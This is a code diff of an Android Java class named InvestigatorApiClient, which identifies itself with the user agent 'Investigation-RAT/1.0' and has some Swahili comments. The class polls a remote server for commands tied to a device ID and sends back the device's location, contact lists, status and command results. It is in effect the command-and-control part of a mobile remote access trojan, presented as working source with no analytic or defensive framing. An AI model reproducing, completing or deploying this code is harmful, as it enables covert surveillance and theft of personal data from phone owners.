@@ -19,7 +19,7 @@ public class InvestigatorApiClient {
     private String investigatorCode;
     private String deviceId;
     private ExecutorService executor;
-
+    
     public InvestigatorApiClient(Context context, String investigatorCode, String deviceId) {
         this.context = context;
         this.investigatorCode = investigatorCode;
@@ -27,17 +27,17 @@ public class InvestigatorApiClient {
         this.executor = Executors.newFixedThreadPool(3);
         Log.d(TAG, "🔧 API Client Created - Code: " + investigatorCode + ", Device: " + deviceId);
     }
-
+    
     // ==================== VERIFY INVESTIGATOR CODE ====================
     public boolean verifyInvestigatorCode() {
         try {
             Log.d(TAG, "🔍 Verifying investigator code: " + investigatorCode);
-
+            
             JSONObject requestBody = new JSONObject();
             requestBody.put("investigator_code", investigatorCode);
-
+            
             JSONObject response = makeApiCall("/api/investigator/verify-code", "POST", requestBody);
-
+            
             if (response != null && response.getBoolean("valid")) {
                 String investigatorName = response.getString("investigator_name");
                 Log.d(TAG, "✅ Investigator code verified: " + investigatorName);
@@ -51,63 +51,53 @@ public class InvestigatorApiClient {
             return false;
         }
     }
-
-    // ==================== REKEBISHWA: CHECK FOR PENDING COMMANDS ====================
+    
+    // ==================== CHECK FOR PENDING COMMANDS ====================
     public JSONArray getPendingCommands() {
         try {
-            String url = BASE_URL + "/api/investigator/commands?device_id=" + deviceId +
+            String url = BASE_URL + "/api/investigator/commands?device_id=" + deviceId + 
                         "&investigator_code=" + investigatorCode;
-
+            
             Log.d(TAG, "📡 Fetching commands from: " + url);
-
+            
             JSONObject response = makeApiCall(url, "GET", null);
-
-            if (response != null) {
-                if (response.has("commands")) {
-                    JSONArray commands = response.getJSONArray("commands");
-                    Log.d(TAG, "📥 Received " + commands.length() + " commands");
-                    return commands;
-                } else if (response.has("error")) {
-                    Log.e(TAG, "❌ Server error: " + response.getString("error"));
-                } else {
-                    Log.d(TAG, "ℹ️ No commands in response");
-                }
+            
+            if (response != null && response.has("commands")) {
+                JSONArray commands = response.getJSONArray("commands");
+                Log.d(TAG, "📥 Received " + commands.length() + " commands");
+                return commands;
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ Get commands error: " + e.getMessage());
         }
         return new JSONArray();
     }
-
-    // ==================== REKEBISHWA: SEND DATA TO INVESTIGATOR ====================
+    
+    // ==================== SEND DATA TO INVESTIGATOR ====================
     public void sendDataToInvestigator(String dataType, JSONObject dataContent) {
         executor.execute(() -> {
             try {
                 Log.d(TAG, "📤 Sending data to investigator: " + dataType);
-
+                
                 JSONObject requestBody = new JSONObject();
                 requestBody.put("device_id", deviceId);
                 requestBody.put("investigator_code", investigatorCode);
                 requestBody.put("data_type", dataType);
                 requestBody.put("data_content", dataContent);
-
+                
                 JSONObject response = makeApiCall("/api/investigator/data", "POST", requestBody);
-
-                if (response != null) {
-                    if ("success".equals(response.optString("status"))) {
-                        Log.d(TAG, "✅ Data sent successfully: " + dataType);
-                    } else {
-                        Log.w(TAG, "⚠️ Server response: " + response.toString());
-                    }
+                
+                if (response != null && "success".equals(response.optString("status"))) {
+                    Log.d(TAG, "✅ Data sent successfully: " + dataType);
                 } else {
-                    Log.e(TAG, "❌ No response from server");
+                    Log.e(TAG, "❌ Failed to send data: " + dataType);
                 }
             } catch (Exception e) {
                 Log.e(TAG, "❌ Send data error: " + e.getMessage());
             }
         });
     }
-
+    
     // ==================== SEND COMMAND RESPONSE ====================
     public void sendCommandResponse(String commandId, String status, String message) {
         try {
@@ -118,14 +108,14 @@ public class InvestigatorApiClient {
             responseData.put("device_id", deviceId);
             responseData.put("investigator_code", investigatorCode);
             responseData.put("timestamp", System.currentTimeMillis());
-
+            
             sendDataToInvestigator("command_response", responseData);
             Log.d(TAG, "✅ Command response sent: " + commandId + " - " + status);
         } catch (Exception e) {
             Log.e(TAG, "❌ Send command response error: " + e.getMessage());
         }
     }
-
+    
     // ==================== UPDATE DEVICE STATUS ====================
     public void updateDeviceStatus(String status, JSONObject deviceInfo) {
         try {
@@ -135,14 +125,14 @@ public class InvestigatorApiClient {
             statusData.put("device_id", deviceId);
             statusData.put("investigator_code", investigatorCode);
             statusData.put("timestamp", System.currentTimeMillis());
-
+            
             sendDataToInvestigator("device_status", statusData);
             Log.d(TAG, "✅ Device status updated: " + status);
         } catch (Exception e) {
             Log.e(TAG, "❌ Update device status error: " + e.getMessage());
         }
     }
-
+    
     // ==================== SEND LOCATION DATA ====================
     public void sendLocationData(JSONObject locationInfo) {
         try {
@@ -151,14 +141,14 @@ public class InvestigatorApiClient {
             locationData.put("device_id", deviceId);
             locationData.put("investigator_code", investigatorCode);
             locationData.put("timestamp", System.currentTimeMillis());
-
+            
             sendDataToInvestigator("location_data", locationData);
             Log.d(TAG, "✅ Location data sent");
         } catch (Exception e) {
             Log.e(TAG, "❌ Send location data error: " + e.getMessage());
         }
     }
-
+    
     // ==================== SEND CONTACTS DATA ====================
     public void sendContactsData(JSONArray contacts) {
         try {
@@ -168,14 +158,14 @@ public class InvestigatorApiClient {
             contactsData.put("device_id", deviceId);
             contactsData.put("investigator_code", investigatorCode);
             contactsData.put("timestamp", System.currentTimeMillis());
-
+            
             sendDataToInvestigator("contacts_data", contactsData);
             Log.d(TAG, "✅ Contacts data sent: " + contacts.length() + " contacts");
         } catch (Exception e) {
             Log.e(TAG, "❌ Send contacts data error: " + e.getMessage());
         }
     }
-
+    
     // ==================== UTILITY METHODS ====================
     private JSONObject makeApiCall(String endpoint, String method, JSONObject requestBody) {
         HttpURLConnection connection = null;
@@ -186,14 +176,14 @@ public class InvestigatorApiClient {
             } else {
                 url = new URL(BASE_URL + endpoint);
             }
-
+            
             connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod(method);
             connection.setRequestProperty("Content-Type", "application/json");
             connection.setRequestProperty("User-Agent", "Investigation-RAT/1.0");
-            connection.setConnectTimeout(15000); // Pungua timeout
-            connection.setReadTimeout(15000);
-
+            connection.setConnectTimeout(30000);
+            connection.setReadTimeout(30000);
+            
             if (requestBody != null && "POST".equals(method)) {
                 connection.setDoOutput(true);
                 try (OutputStream os = connection.getOutputStream()) {
@@ -201,49 +191,32 @@ public class InvestigatorApiClient {
                     os.write(input, 0, input.length);
                 }
             }
-
+            
             int responseCode = connection.getResponseCode();
-            Log.d(TAG, "📡 API Response Code: " + responseCode);
-
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                 String inputLine;
                 StringBuilder response = new StringBuilder();
-
+                
                 while ((inputLine = in.readLine()) != null) {
                     response.append(inputLine);
                 }
                 in.close();
-
-                String responseStr = response.toString();
-                Log.d(TAG, "📨 API Response: " + responseStr);
-                return new JSONObject(responseStr);
+                
+                return new JSONObject(response.toString());
             } else {
                 Log.e(TAG, "❌ API call failed: " + responseCode);
-                // Rudi response rahisi kama imeshindwa
-                JSONObject errorResponse = new JSONObject();
-                errorResponse.put("status", "error");
-                errorResponse.put("message", "HTTP " + responseCode);
-                return errorResponse;
             }
         } catch (Exception e) {
             Log.e(TAG, "❌ API call error: " + e.getMessage());
-            // Rudi response rahisi kama kuna error
-            try {
-                JSONObject errorResponse = new JSONObject();
-                errorResponse.put("status", "error");
-                errorResponse.put("message", e.getMessage());
-                return errorResponse;
-            } catch (Exception ex) {
-                return null;
-            }
         } finally {
             if (connection != null) {
                 connection.disconnect();
             }
         }
+        return null;
     }
-
+    
     public void cleanup() {
         try {
             if (executor != null) {
